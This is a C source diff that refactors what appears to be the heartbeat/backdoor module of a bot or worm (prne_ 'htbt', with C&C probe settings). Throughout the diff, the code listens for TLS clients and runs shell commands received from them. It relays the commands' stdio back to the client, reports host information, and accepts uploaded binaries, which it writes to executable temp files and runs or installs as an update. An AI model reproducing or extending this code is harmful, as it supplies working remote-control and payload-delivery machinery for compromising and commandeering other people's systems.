@@ -24,27 +24,38 @@
 #define HTBT_CNCP_INT_VAR	2000
 #define HTBT_LBD_PORT		prne_htobe16(PRNE_HTBT_PROTO_PORT)
 #define HTBT_LBD_BACKLOG	4
-// LBD Socket Operation Timeout
-static const struct timespec HTBT_LBD_SCK_OP_TIMEOUT = { 10, 0 }; // 10s
-// LBD Status Send Timeout
-static const struct timespec HTBT_LBD_STATUS_SND_TIMEOUT = { 5, 0 }; // 5s
+// Slave Socket Operation Timeout
+static const struct timespec HTBT_SLV_SCK_OP_TIMEOUT = { 10, 0 }; // 10s
+// Slave Status Send Timeout
+static const struct timespec HTBT_SLV_STATUS_SND_TIMEOUT = { 5, 0 }; // 5s
 // LBD Socket Bind Retry Interval
 static const struct timespec HTBT_LBD_BIND_INT = { 5, 0 }; // 5s
-// LBD TLS Close Timeout
-static const struct timespec HTBT_LBD_CLOSE_TIMEOUT = { 3, 0 }; // 3s
+// TLS Close Timeout
+static const struct timespec HTBT_CLOSE_TIMEOUT = { 3, 0 }; // 3s
 // Relay child Timeout
 static const struct timespec HTBT_RELAY_CHILD_TIMEOUT = { 60, 0 }; // 60s
 // Download tick timeout
 static const struct timespec HTBT_DL_TICK_TIMEOUT = { 30, 0 }; // 30s
 
 typedef struct {
-	pth_t pth;
-	prne_htbt_t *parent;
-	size_t skip;
+	int fd[2];
 	prne_iobuf_t iobuf[2];
-	int fd;
-	bool valid;
+	void *ioctx;
+	bool (*setup_f)(void *ioctx, pth_event_t ev);
+	void (*cleanup_f)(void *ioctx, pth_event_t ev);
+	int (*read_f)(void *ioctx, void *buf, const size_t len);
+	int (*write_f)(void *ioctx, const void *buf, const size_t len);
+	const prne_htbt_cbset_t *cbset;
+	prne_pth_cv_t cv;
+	size_t skip;
+	bool valid; // TODO: set to false on exit
+} htbt_slv_ctx_t;
+
+typedef struct {
+	pth_t pth;
+	htbt_slv_ctx_t slv;
 	mbedtls_ssl_context ssl;
+	int fd;
 } htbt_lbd_client_t;
 
 typedef struct {
@@ -200,268 +211,19 @@ static void *htbt_cncp_entry (void *p) {
 	return NULL;
 }
 
-static bool htbt_lbd_client_handshake (htbt_lbd_client_t *ctx) {
-	pth_event_t ev = pth_event(
-		PTH_EVENT_TIME,
-		prne_pth_tstimeout(HTBT_LBD_SCK_OP_TIMEOUT));
-	bool ret;
+/**/
 
-	ret = ev != NULL && prne_mbedtls_pth_handle(
-		&ctx->ssl,
-		mbedtls_ssl_handshake,
-		ctx->fd,
-		ev);
-	pth_event_free(ev, FALSE);
-
-	return ret;
-}
-
-static void htbt_lbd_proc_close (htbt_lbd_client_t *ctx) {
-	pth_event_t ev;
-
-	ev = pth_event(
-		PTH_EVENT_TIME,
-		prne_pth_tstimeout(HTBT_LBD_CLOSE_TIMEOUT));
-	prne_mbedtls_pth_handle(
-		&ctx->ssl,
-		mbedtls_ssl_close_notify,
-		ctx->fd,
-		ev);
-	pth_event_free(ev, FALSE);
-	prne_shutdown(ctx->fd, SHUT_RDWR);
-	prne_close(ctx->fd);
-	ctx->fd = -1;
-
-	ctx->valid = false;
-}
-
-static void htbt_lbd_consume_outbuf (
-	htbt_lbd_client_t *ctx,
-	const size_t req_size,
-	pth_event_t root_ev)
-{
-	struct pollfd pfd;
-	int fret;
-
-	pfd.fd = ctx->fd;
-	pfd.events = POLLOUT;
-
-	while (ctx->iobuf[1].len > 0) {
-		fret = pth_poll_ev(&pfd, 1, -1, root_ev);
-		if (root_ev != NULL &&
-			pth_event_status(root_ev) != PTH_STATUS_PENDING)
-		{
-			break;
-		}
-		if (fret == 1 && pfd.revents & POLLOUT) {
-			fret = mbedtls_ssl_write(
-				&ctx->ssl,
-				ctx->iobuf[1].m,
-				ctx->iobuf[1].len);
-			if (fret <= 0) {
-				ctx->valid = false;
-				break;
-			}
-			prne_iobuf_shift(ctx->iobuf + 1, -fret);
-		}
-		else {
-			break;
-		}
-
-		if (ctx->iobuf[1].avail >= req_size) {
-			break;
-		}
-	}
-}
-
-static void htbt_lbd_fab_frame (
-	htbt_lbd_client_t *ctx,
-	const prne_htbt_msg_head_t *mh,
-	const void *body,
-	prne_htbt_ser_ft ser_f,
-	pth_event_t ev)
-{
-	size_t req, actual;
-
-	prne_assert(ev != NULL);
-
-	req = 0;
-	prne_htbt_ser_msg_head(NULL, 0, &actual, mh);
-	req += actual;
-	ser_f(NULL, 0, &actual, body);
-	req += actual;
-
-	prne_assert(req <= ctx->iobuf[1].size);
-	htbt_lbd_consume_outbuf(ctx, req, ev);
-	if (!ctx->valid) {
-		return;
-	}
-
-	prne_htbt_ser_msg_head(
-		ctx->iobuf[1].m + ctx->iobuf[1].len,
-		ctx->iobuf[1].avail,
-		&actual,
-		mh);
-	prne_iobuf_shift(ctx->iobuf + 1, actual);
-	ser_f(
-		ctx->iobuf[1].m + ctx->iobuf[1].len,
-		ctx->iobuf[1].avail,
-		&actual,
-		body);
-	prne_iobuf_shift(ctx->iobuf + 1, actual);
-}
-
-static void htbt_lbd_fab_status (
-	htbt_lbd_client_t *ctx,
-	prne_htbt_status_code_t status,
-	int32_t err,
-	uint16_t corr_msgid,
-	pth_event_t ev)
-{
-	prne_htbt_msg_head_t mh;
-	prne_htbt_status_t s;
-	pth_event_t my_ev = NULL;
-
-	if (ev == NULL) {
-		my_ev = pth_event(
-			PTH_EVENT_TIME,
-			prne_pth_tstimeout(HTBT_LBD_STATUS_SND_TIMEOUT));
-		ev = my_ev;
-	}
-	prne_assert(ev != NULL);
-
-	prne_htbt_init_msg_head(&mh);
-	prne_htbt_init_status(&s);
-	mh.id = corr_msgid;
-	mh.is_rsp = true;
-	mh.op = PRNE_HTBT_OP_STATUS;
-	s.code = status;
-	s.err = err;
-
-	htbt_lbd_fab_frame(
-		ctx,
-		&mh,
-		&s,
-		(prne_htbt_ser_ft)prne_htbt_ser_status,
-		ev);
-
-	prne_htbt_free_msg_head(&mh);
-	prne_htbt_free_status(&s);
-	pth_event_free(my_ev, FALSE);
-}
-
-static void htbt_lbd_raise_protoerr (
-	htbt_lbd_client_t *ctx,
-	uint16_t corr_msgid,
-	int32_t err)
-{
-	pth_event_t ev = pth_event(
-		PTH_EVENT_TIME,
-		prne_pth_tstimeout(HTBT_LBD_STATUS_SND_TIMEOUT));
-
-	prne_assert(ev != NULL);
-	htbt_lbd_fab_status(
-		ctx,
-		PRNE_HTBT_STATUS_PROTO_ERR,
-		err,
-		corr_msgid,
-		ev);
-	htbt_lbd_consume_outbuf(ctx, ctx->iobuf[1].len, ev);
-	ctx->valid = false;
-
-	pth_event_free(ev, FALSE);
-}
-
-static void htbt_lbd_srv_stdio (
-	htbt_lbd_client_t *ctx,
-	pth_event_t root_ev,
-	size_t off,
-	const prne_htbt_msg_head_t *mh)
-{
-	prne_htbt_stdio_t sh;
-	size_t actual;
-	prne_htbt_ser_rc_t s_ret;
-
-	prne_htbt_init_stdio(&sh);
-
-	s_ret = prne_htbt_dser_stdio(
-		ctx->iobuf[0].m + off,
-		ctx->iobuf[0].len - off,
-		&actual,
-		&sh);
-	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
-		goto END;
-	}
-	else {
-		prne_iobuf_shift(ctx->iobuf + 0, -(off + actual));
-	}
-	if (s_ret != PRNE_HTBT_SER_RC_OK) {
-		htbt_lbd_raise_protoerr(
-			ctx,
-			mh->id,
-			0);
-		goto END;
-	}
-
-	ctx->skip = sh.len;
-END:
-	prne_htbt_free_stdio(&sh);
-}
-
-static void htbt_lbd_srv_hostinfo (
-	htbt_lbd_client_t *ctx,
-	pth_event_t root_ev,
-	size_t off,
-	const prne_htbt_msg_head_t *mh)
-{
-	prne_htbt_host_info_t hi;
-
-	prne_iobuf_shift(ctx->iobuf + 0, -off);
-
-	if (ctx->parent->param.cb_f.hostinfo == NULL) {
-		htbt_lbd_fab_status(
-			ctx,
-			PRNE_HTBT_STATUS_UNIMPL,
-			0,
-			mh->id,
-			root_ev);
-		return;
-	}
-
-	prne_htbt_init_host_info(&hi);
-
-	if (ctx->parent->param.cb_f.hostinfo(&hi)) {
-		htbt_lbd_fab_frame(
-			ctx,
-			mh,
-			&hi,
-			(prne_htbt_ser_ft)prne_htbt_ser_host_info,
-			root_ev);
-	}
-	else {
-		htbt_lbd_fab_status(
-			ctx,
-			PRNE_HTBT_STATUS_ERRNO,
-			errno,
-			mh->id,
-			root_ev);
-	}
-
-	prne_htbt_free_host_info(&hi);
-}
-
-static bool htbt_relay_child (
-	const int conn,
-	mbedtls_ssl_context *ssl,
-	prne_iobuf_t *iobuf,
+/* htbt_relay_child()
+*/
+static prne_htbt_status_code_t htbt_relay_child (
+	htbt_slv_ctx_t *ctx,
 	const uint16_t msg_id,
 	int *c_in,
 	int *c_out,
 	int *c_err)
 {
-	bool conn_rd = true;
-	bool ret = true;
-	struct pollfd pfd[4];
+	prne_htbt_status_code_t ret = PRNE_HTBT_STATUS_OK;
+	struct pollfd pfd[5];
 	prne_htbt_msg_head_t mh;
 	prne_htbt_stdio_t sh[2];
 	int f_ret, pending, out_p = 0;
@@ -469,41 +231,44 @@ static bool htbt_relay_child (
 	ssize_t consume;
 	pth_event_t ev = NULL;
 
-	pfd[0].fd = conn;
-	pfd[1].fd = *c_in;
-	pfd[2].fd = *c_out;
-	pfd[3].fd = *c_err;
+	pfd[0].fd = ctx->fd[0];
+	pfd[1].fd = ctx->fd[1];
+	pfd[2].fd = *c_in;
+	pfd[3].fd = *c_out;
+	pfd[4].fd = *c_err;
 	prne_htbt_init_msg_head(&mh);
 	prne_htbt_init_stdio(sh + 0);
 	prne_htbt_init_stdio(sh + 1);
 
-	while ((!sh[0].fin && sh[0].len > 0) ||
-		iobuf[1].len > 0 ||
-		pfd[2].fd >= 0 ||
-		pfd[3].fd >= 0)
+	while ((!sh[0].fin && sh[0].len > 0) || // has pending stdin data
+		ctx->iobuf[1].len > 0 || // has pending stdout data
+		pfd[3].fd >= 0 || // child stdout is still open
+		pfd[4].fd >= 0) // child stdout is still open
 	{
-		pfd[0].events = 0;
-		if (iobuf[1].len > 0) {
-			pfd[0].events |= POLLOUT;
-		}
-		if (conn_rd && iobuf[0].avail > 0 && !(sh[0].fin && sh[0].len == 0)) {
-			pfd[0].events |= POLLIN;
-		}
-
-		if (sh[0].len > 0 && iobuf[0].len > 0) {
-			pfd[1].events = POLLOUT;
+		// Setup events
+		if (ctx->iobuf[0].avail > 0 && !(sh[0].fin && sh[0].len == 0)) {
+			pfd[0].events = POLLIN;
 		}
 		else {
-			pfd[1].events = 0;
+			pfd[0].events = 0;
 		}
 
-		pfd[2].events = 0;
+		pfd[1].events = ctx->iobuf[1].len > 0 ? POLLOUT : 0;
+
+		if (sh[0].len > 0 && ctx->iobuf[0].len > 0) {
+			pfd[2].events = POLLOUT;
+		}
+		else {
+			pfd[2].events = 0;
+		}
+
 		pfd[3].events = 0;
-		if (iobuf[1].len == 0) {
-			if (pfd[2 + out_p].fd < 0) {
+		pfd[4].events = 0;
+		if (ctx->iobuf[1].len == 0) {
+			if (pfd[3 + out_p].fd < 0) {
 				out_p = (out_p + 1) % 2;
 			}
-			pfd[2 + out_p].events |= POLLIN;
+			pfd[3 + out_p].events = POLLIN;
 		}
 
 		pth_event_free(ev, FALSE);
@@ -512,23 +277,23 @@ static bool htbt_relay_child (
 			prne_pth_tstimeout(HTBT_RELAY_CHILD_TIMEOUT));
 		prne_assert(ev != NULL);
 
-		f_ret = pth_poll_ev(pfd, 4, -1, ev);
+		// Do poll
+		f_ret = pth_poll_ev(pfd, 5, -1, ev);
 		if (f_ret < 0 && errno != EINTR) {
-			ret = false;
+			ret = PRNE_HTBT_STATUS_ERRNO;
 			break;
 		}
-		if (pth_event_status(ev) == PTH_STATUS_OCCURRED ||
-			f_ret == 0 ||
-			(pfd[0].revents & (POLLNVAL | POLLHUP | POLLERR)))
-		{
+		if (pth_event_status(ev) == PTH_STATUS_OCCURRED || f_ret == 0) {
+			ret = PRNE_HTBT_STATUS_TIMEDOUT;
 			break;
 		}
 
+		// Handle events
 		if (!sh[0].fin && sh[0].len == 0) {
 			do {
 				if (prne_htbt_dser_msg_head(
-					iobuf[0].m,
-					iobuf[0].len,
+					ctx->iobuf[0].m,
+					ctx->iobuf[0].len,
 					&actual,
 					&mh) != PRNE_HTBT_SER_RC_OK)
 				{
@@ -543,44 +308,52 @@ static bool htbt_relay_child (
 					break;
 				}
 				if (prne_htbt_dser_stdio(
-					iobuf[0].m + consume,
-					iobuf[0].len - consume,
+					ctx->iobuf[0].m + consume,
+					ctx->iobuf[0].len - consume,
 					&actual,
 					sh + 0) != PRNE_HTBT_SER_RC_OK)
 				{
 					break;
 				}
 				consume += actual;
-				prne_iobuf_shift(iobuf + 0, -consume);
+				prne_iobuf_shift(ctx->iobuf + 0, -consume);
 			} while (false);
 		}
 
 		if (pfd[0].revents & POLLIN) {
-			f_ret = mbedtls_ssl_read(
-				ssl,
-				iobuf[0].m + iobuf[0].len,
-				iobuf[0].avail);
+			f_ret = ctx->read_f(
+				ctx->ioctx,
+				ctx->iobuf[0].m + ctx->iobuf[0].len,
+				ctx->iobuf[0].avail);
 			if (f_ret == 0) {
-				conn_rd = false;
+				pfd[0].fd = -1;
+				if (sh[0].len > 0) {
+					// There's still pending stdin data and EOF.
+					// This is proto err.
+					ret = PRNE_HTBT_STATUS_PROTO_ERR;
+					break;
+				}
 			}
 			else if (f_ret < 0) {
+				ctx->valid = false;
 				break;
 			}
 			else {
-				prne_iobuf_shift(iobuf + 0, f_ret);
+				prne_iobuf_shift(ctx->iobuf + 0, f_ret);
 			}
 		}
 
-		if (pfd[0].revents & POLLOUT) {
-			f_ret = mbedtls_ssl_write(
-				ssl,
-				iobuf[1].m,
-				iobuf[1].len);
+		if (pfd[1].revents & POLLOUT) {
+			f_ret = ctx->write_f(
+				ctx->ioctx,
+				ctx->iobuf[1].m,
+				ctx->iobuf[1].len);
 			if (f_ret <= 0) {
+				ctx->valid = false;
 				break;
 			}
 			else {
-				prne_iobuf_shift(iobuf + 1, -f_ret);
+				prne_iobuf_shift(ctx->iobuf + 1, -f_ret);
 				if (pending > 0) {
 					pending -= f_ret;
 				}
@@ -593,36 +366,40 @@ static bool htbt_relay_child (
 			}
 		}
 
-		if (pfd[1].fd < 0 && sh[0].len > 0) {
-			consume = prne_op_min(iobuf[0].len, sh[0].len);
-
-			prne_iobuf_shift(iobuf + 0, -consume);
+		consume = prne_op_min(ctx->iobuf[0].len, sh[0].len);
+		if (pfd[2].fd < 0 && sh[0].len > 0) {
+			// Stdin data coming in, but the child has already closed stdin
+			prne_iobuf_shift(ctx->iobuf + 0, -consume);
 			sh[0].len -= consume;
 		}
-		else if (pfd[1].revents) {
-			consume = prne_op_min(iobuf[0].len, sh[0].len);
-
-			f_ret = write(*c_in, iobuf[0].m, consume);
+		else if (pfd[2].revents) {
+			f_ret = write(*c_in, ctx->iobuf[0].m, consume);
 			if (f_ret > 0) {
 				consume = f_ret;
 			}
 			else {
-				pfd[1].fd = -1;
+				pfd[2].fd = -1;
 			}
 
-			prne_iobuf_shift(iobuf + 0, -consume);
+			prne_iobuf_shift(ctx->iobuf + 0, -consume);
 			sh[0].len -= consume;
 		}
 
-		if (sh[0].fin && sh[0].len == 0 && pfd[1].fd >= 0) {
+		if (sh[0].fin && sh[0].len == 0 && pfd[2].fd >= 0) {
+			// End of stdin stream
 			close(*c_in);
 			*c_in = -1;
-			pfd[1].fd = -1;
+			pfd[2].fd = -1;
 		}
 
-		if (pfd[2 + out_p].revents) {
+		if (pfd[3 + out_p].revents) {
 			if (sh[1].len == 0) {
-				prne_assert(ioctl(pfd[2 + out_p].fd, FIONREAD, &pending) == 0);
+/*
+* FIONREAD is not standardised. On platforms where it's not supported, ioctl()
+* fails or pending is always 0. The former case is fatal. The latter case
+* results in a weird bug.
+*/
+				prne_assert(ioctl(pfd[3 + out_p].fd, FIONREAD, &pending) == 0);
 
 				sh[1].len = (size_t)prne_op_min(
 					pending,
@@ -634,30 +411,30 @@ static bool htbt_relay_child (
 				mh.op = PRNE_HTBT_OP_STDIO;
 
 				prne_assert(prne_htbt_ser_msg_head(
-					iobuf[1].m + iobuf[1].len,
-					iobuf[1].avail,
+					ctx->iobuf[1].m + ctx->iobuf[1].len,
+					ctx->iobuf[1].avail,
 					&actual,
 					&mh) == PRNE_HTBT_SER_RC_OK);
 				pending = (int)actual;
 				prne_assert(prne_htbt_ser_stdio(
-					iobuf[1].m + iobuf[1].len + pending,
-					iobuf[1].avail - pending,
+					ctx->iobuf[1].m + ctx->iobuf[1].len + pending,
+					ctx->iobuf[1].avail - pending,
 					&actual,
 					sh + 1) == PRNE_HTBT_SER_RC_OK);
 				pending += (int)actual;
-				prne_iobuf_shift(iobuf + 1, pending);
+				prne_iobuf_shift(ctx->iobuf + 1, pending);
 
 				if (sh[1].fin) {
-					pfd[2 + out_p].fd = -1;
+					pfd[3 + out_p].fd = -1;
 				}
 			}
 			else {
 				f_ret = read(
-					pfd[2 + out_p].fd,
-					iobuf[1].m + iobuf[1].len,
-					prne_op_min(sh[1].len, iobuf[1].avail));
+					pfd[3 + out_p].fd,
+					ctx->iobuf[1].m + ctx->iobuf[1].len,
+					prne_op_min(sh[1].len, ctx->iobuf[1].avail));
 				prne_dbgast(f_ret > 0);
-				prne_iobuf_shift(iobuf + 1, f_ret);
+				prne_iobuf_shift(ctx->iobuf + 1, f_ret);
 			}
 		}
 	}
@@ -677,9 +454,7 @@ static bool htbt_relay_child (
 static void htbt_do_cmd (
 	const bool detach,
 	char *const *args,
-	const int conn,
-	mbedtls_ssl_context *ssl,
-	prne_iobuf_t *iobuf,
+	htbt_slv_ctx_t *ctx,
 	const uint16_t msg_id,
 	prne_htbt_status_code_t *out_status,
 	int32_t *out_err)
@@ -791,28 +566,38 @@ static void htbt_do_cmd (
 			goto END;
 		}
 
-		if (htbt_relay_child(conn, ssl, iobuf, msg_id, &cin[1], &cout[0], &cerr[0])) {
-			if (pth_waitpid(child, &chld_status, WUNTRACED) < 0) {
-				ret_status = PRNE_HTBT_STATUS_ERRNO;
+		ret_status = htbt_relay_child(
+			ctx,
+			msg_id,
+			&cin[1],
+			&cout[0],
+			&cerr[0]);
+		if (ret_status != PRNE_HTBT_STATUS_OK) {
+			if (ret_status == PRNE_HTBT_STATUS_ERRNO) {
 				ret_err = errno;
-				goto END;
 			}
-			else if (WIFEXITED(chld_status)) {
-				ret_err = WEXITSTATUS(chld_status);
-				child = -1;
-			}
-			else if (WIFSIGNALED(chld_status)) {
-				ret_err = 128 + WTERMSIG(chld_status);
-				child = -1;
-			}
-			else {
-				// child has been stopped just right before exit
-				ret_err = -1;
-			}
+			goto END;
 		}
-		else {
+
+		if (pth_waitpid(child, &chld_status, WUNTRACED) < 0) {
 			ret_status = PRNE_HTBT_STATUS_ERRNO;
 			ret_err = errno;
+			goto END;
+		}
+		else if (WIFEXITED(chld_status)) {
+			ret_err = WEXITSTATUS(chld_status);
+			child = -1;
+		}
+		else if (WIFSIGNALED(chld_status)) {
+			ret_err = 128 + WTERMSIG(chld_status);
+			child = -1;
+		}
+		else if (WIFSTOPPED(chld_status)) {
+			// child has been stopped just right before exit
+			ret_err = 128 + SIGSTOP;
+		}
+		else {
+			ret_err = -1; // WTF?
 		}
 	}
 
@@ -838,12 +623,229 @@ END:
 	}
 }
 
-static void htbt_lbd_srv_run_cmd (
-	htbt_lbd_client_t *ctx,
+static void htbt_slv_consume_outbuf (
+	htbt_slv_ctx_t *ctx,
+	const size_t req_size,
+	pth_event_t root_ev)
+{
+	struct pollfd pfd;
+	int fret;
+
+	pfd.fd = ctx->fd[1];
+	pfd.events = POLLOUT;
+
+	while (ctx->valid && ctx->iobuf[1].len > 0) {
+		fret = pth_poll_ev(&pfd, 1, -1, root_ev);
+		if (root_ev != NULL &&
+			pth_event_status(root_ev) != PTH_STATUS_PENDING)
+		{
+			break;
+		}
+		if (fret == 1 && pfd.revents & POLLOUT) {
+			fret = ctx->write_f(
+				ctx->ioctx,
+				ctx->iobuf[1].m,
+				ctx->iobuf[1].len);
+			if (fret <= 0) {
+				ctx->valid = false;
+				break;
+			}
+			prne_iobuf_shift(ctx->iobuf + 1, -fret);
+		}
+		else {
+			break;
+		}
+
+		if (ctx->iobuf[1].avail >= req_size) {
+			break;
+		}
+	}
+}
+
+static void htbt_slv_fab_frame (
+	htbt_slv_ctx_t *ctx,
+	const prne_htbt_msg_head_t *mh,
+	const void *body,
+	prne_htbt_ser_ft ser_f,
+	pth_event_t ev)
+{
+	size_t req, actual;
+
+	prne_assert(ev != NULL);
+
+	req = 0;
+	prne_htbt_ser_msg_head(NULL, 0, &actual, mh);
+	req += actual;
+	ser_f(NULL, 0, &actual, body);
+	req += actual;
+
+	prne_assert(req <= ctx->iobuf[1].size);
+	htbt_slv_consume_outbuf(ctx, req, ev);
+
+	prne_htbt_ser_msg_head(
+		ctx->iobuf[1].m + ctx->iobuf[1].len,
+		ctx->iobuf[1].avail,
+		&actual,
+		mh);
+	prne_iobuf_shift(ctx->iobuf + 1, actual);
+	ser_f(
+		ctx->iobuf[1].m + ctx->iobuf[1].len,
+		ctx->iobuf[1].avail,
+		&actual,
+		body);
+	prne_iobuf_shift(ctx->iobuf + 1, actual);
+}
+
+static void htbt_slv_fab_status (
+	htbt_slv_ctx_t *ctx,
+	prne_htbt_status_code_t status,
+	int32_t err,
+	uint16_t corr_msgid,
+	pth_event_t ev)
+{
+	prne_htbt_msg_head_t mh;
+	prne_htbt_status_t s;
+	pth_event_t my_ev = NULL;
+
+	if (ev == NULL) {
+		my_ev = pth_event(
+			PTH_EVENT_TIME,
+			prne_pth_tstimeout(HTBT_SLV_STATUS_SND_TIMEOUT));
+		ev = my_ev;
+	}
+	prne_assert(ev != NULL);
+
+	prne_htbt_init_msg_head(&mh);
+	prne_htbt_init_status(&s);
+	mh.id = corr_msgid;
+	mh.is_rsp = true;
+	mh.op = PRNE_HTBT_OP_STATUS;
+	s.code = status;
+	s.err = err;
+
+	htbt_slv_fab_frame(
+		ctx,
+		&mh,
+		&s,
+		(prne_htbt_ser_ft)prne_htbt_ser_status,
+		ev);
+
+	prne_htbt_free_msg_head(&mh);
+	prne_htbt_free_status(&s);
+	pth_event_free(my_ev, FALSE);
+}
+
+static void htbt_slv_raise_protoerr (
+	htbt_slv_ctx_t *ctx,
+	uint16_t corr_msgid,
+	int32_t err)
+{
+	pth_event_t ev = pth_event(
+		PTH_EVENT_TIME,
+		prne_pth_tstimeout(HTBT_SLV_STATUS_SND_TIMEOUT));
+
+	prne_assert(ev != NULL);
+	htbt_slv_fab_status(
+		ctx,
+		PRNE_HTBT_STATUS_PROTO_ERR,
+		err,
+		corr_msgid,
+		ev);
+	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, ev);
+	ctx->valid = false;
+
+	pth_event_free(ev, FALSE);
+}
+
+static bool htbt_slv_srv_stdio (
+	htbt_slv_ctx_t *ctx,
 	pth_event_t root_ev,
 	size_t off,
 	const prne_htbt_msg_head_t *mh)
 {
+	bool ret = true;
+	prne_htbt_stdio_t sh;
+	size_t actual;
+	prne_htbt_ser_rc_t s_ret;
+
+	prne_htbt_init_stdio(&sh);
+
+	s_ret = prne_htbt_dser_stdio(
+		ctx->iobuf[0].m + off,
+		ctx->iobuf[0].len - off,
+		&actual,
+		&sh);
+	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
+		ret = false;
+		goto END;
+	}
+	else {
+		prne_iobuf_shift(ctx->iobuf + 0, -(off + actual));
+	}
+	if (s_ret != PRNE_HTBT_SER_RC_OK) {
+		htbt_slv_raise_protoerr(
+			ctx,
+			mh->id,
+			0);
+		goto END;
+	}
+
+	ctx->skip = sh.len;
+END:
+	prne_htbt_free_stdio(&sh);
+
+	return ret;
+}
+
+static void htbt_slv_srv_hostinfo (
+	htbt_slv_ctx_t *ctx,
+	pth_event_t root_ev,
+	size_t off,
+	const prne_htbt_msg_head_t *mh)
+{
+	prne_htbt_host_info_t hi;
+
+	prne_iobuf_shift(ctx->iobuf + 0, -off);
+
+	if (ctx->cbset->hostinfo == NULL) {
+		htbt_slv_fab_status(
+			ctx,
+			PRNE_HTBT_STATUS_UNIMPL,
+			0,
+			mh->id,
+			root_ev);
+		return;
+	}
+
+	prne_htbt_init_host_info(&hi);
+
+	if (ctx->cbset->hostinfo(&hi)) {
+		htbt_slv_fab_frame(
+			ctx,
+			mh,
+			&hi,
+			(prne_htbt_ser_ft)prne_htbt_ser_host_info,
+			root_ev);
+	}
+	else {
+		htbt_slv_fab_status(
+			ctx,
+			PRNE_HTBT_STATUS_ERRNO,
+			errno,
+			mh->id,
+			root_ev);
+	}
+
+	prne_htbt_free_host_info(&hi);
+}
+
+static bool htbt_slv_srv_run_cmd (
+	htbt_slv_ctx_t *ctx,
+	pth_event_t root_ev,
+	size_t off,
+	const prne_htbt_msg_head_t *mh)
+{
+	bool ret = true;
 	size_t actual;
 	prne_htbt_ser_rc_t s_ret;
 	prne_htbt_cmd_t cmd;
@@ -858,13 +860,14 @@ static void htbt_lbd_srv_run_cmd (
 		&actual,
 		&cmd);
 	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
+		ret = false;
 		goto END;
 	}
 	else {
 		prne_iobuf_shift(ctx->iobuf + 0, -(off + actual));
 	}
 	if (s_ret == PRNE_HTBT_SER_RC_ERRNO) {
-		htbt_lbd_fab_status(
+		htbt_slv_fab_status(
 			ctx,
 			PRNE_HTBT_STATUS_ERRNO,
 			errno,
@@ -873,34 +876,28 @@ static void htbt_lbd_srv_run_cmd (
 		goto END;
 	}
 	if (s_ret != PRNE_HTBT_SER_RC_OK) {
-		htbt_lbd_raise_protoerr(ctx, mh->id, 0);
+		htbt_slv_raise_protoerr(ctx, mh->id, 0);
 		goto END;
 	}
 
-	htbt_lbd_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
+	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
 	if (root_ev != NULL && pth_event_status(root_ev) == PTH_STATUS_PENDING) {
-		htbt_do_cmd(
-			cmd.detach,
-			cmd.args,
-			ctx->fd,
-			&ctx->ssl,
-			ctx->iobuf,
-			mh->id,
-			&status,
-			&err);
-		htbt_lbd_fab_status(ctx, status, err, mh->id, NULL);
+		htbt_do_cmd(cmd.detach, cmd.args, ctx, mh->id, &status, &err);
+		htbt_slv_fab_status(ctx, status, err, mh->id, NULL);
 	}
 
 END:
 	prne_htbt_free_cmd(&cmd);
+	return ret;
 }
 
-static void htbt_lbd_srv_bin (
-	htbt_lbd_client_t *ctx,
+static bool htbt_slv_srv_bin (
+	htbt_slv_ctx_t *ctx,
 	pth_event_t root_ev,
 	size_t off,
 	const prne_htbt_msg_head_t *mh)
 {
+	bool ret = true;
 	prne_htbt_bin_meta_t bin_meta;
 	size_t actual;
 	prne_htbt_ser_rc_t s_ret;
@@ -918,7 +915,7 @@ static void htbt_lbd_srv_bin (
 
 	prne_htbt_init_bin_meta(&bin_meta);
 
-	htbt_lbd_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
+	htbt_slv_consume_outbuf(ctx, ctx->iobuf[1].len, root_ev);
 
 	s_ret = prne_htbt_dser_bin_meta(
 		ctx->iobuf[0].m + off,
@@ -926,6 +923,7 @@ static void htbt_lbd_srv_bin (
 		&actual,
 		&bin_meta);
 	if (s_ret == PRNE_HTBT_SER_RC_MORE_BUF) {
+		ret = false;
 		goto END;
 	}
 	else {
@@ -936,20 +934,14 @@ static void htbt_lbd_srv_bin (
 		goto PROTO_ERR;
 	}
 
-	if (ctx->parent->param.cb_f.tmpfile == NULL) {
+	if (ctx->cbset->tmpfile == NULL ||
+		(mh->op == PRNE_HTBT_OP_NY_BIN && ctx->cbset->ny_bin == NULL)) {
 		ret_status = PRNE_HTBT_STATUS_UNIMPL;
 		goto SND_STATUS;
 	}
-	if (mh->op == PRNE_HTBT_OP_NY_BIN &&
-		ctx->parent->param.cb_f.ny_bin == NULL)
-	{
-		ret_status = PRNE_HTBT_STATUS_UNIMPL;
-		goto SND_STATUS;
-	}
-
 
 	errno = 0;
-	path = ctx->parent->param.cb_f.tmpfile(bin_meta.bin_size, 0700);
+	path = ctx->cbset->tmpfile(bin_meta.bin_size, 0700);
 	if (path == NULL) {
 		ret_status = PRNE_HTBT_STATUS_ERRNO;
 		ret_errno = errno;
@@ -964,7 +956,7 @@ static void htbt_lbd_srv_bin (
 	}
 	fcntl(fd, F_SETFD, FD_CLOEXEC);
 
-	pfd.fd = ctx->fd;
+	pfd.fd = ctx->fd[0];
 	pfd.events = POLLIN;
 	while (bin_meta.bin_size > 0) {
 		pth_event_free(ev, FALSE);
@@ -984,11 +976,14 @@ static void htbt_lbd_srv_bin (
 			}
 
 			if (pfd.revents & POLLIN) {
-				f_ret = mbedtls_ssl_read(
-					&ctx->ssl,
+				f_ret = ctx->read_f(
+					ctx->ioctx,
 					ctx->iobuf[0].m,
 					ctx->iobuf[0].avail);
 				if (f_ret <= 0) {
+					if (f_ret < 0) {
+						ctx->valid = false;
+					}
 					goto PROTO_ERR;
 				}
 				prne_iobuf_shift(ctx->iobuf + 0, f_ret);
@@ -1029,15 +1024,13 @@ static void htbt_lbd_srv_bin (
 		htbt_do_cmd(
 			bin_meta.cmd.detach,
 			args,
-			ctx->fd,
-			&ctx->ssl,
-			ctx->iobuf,
+			ctx,
 			mh->id,
 			&ret_status,
 			&ret_errno);
 	}
 	else {
-		if (!ctx->parent->param.cb_f.ny_bin(path, &bin_meta.cmd)) {
+		if (!ctx->cbset->ny_bin(path, &bin_meta.cmd)) {
 			ret_status = PRNE_HTBT_STATUS_ERRNO;
 			ret_errno = errno;
 			goto SND_STATUS;
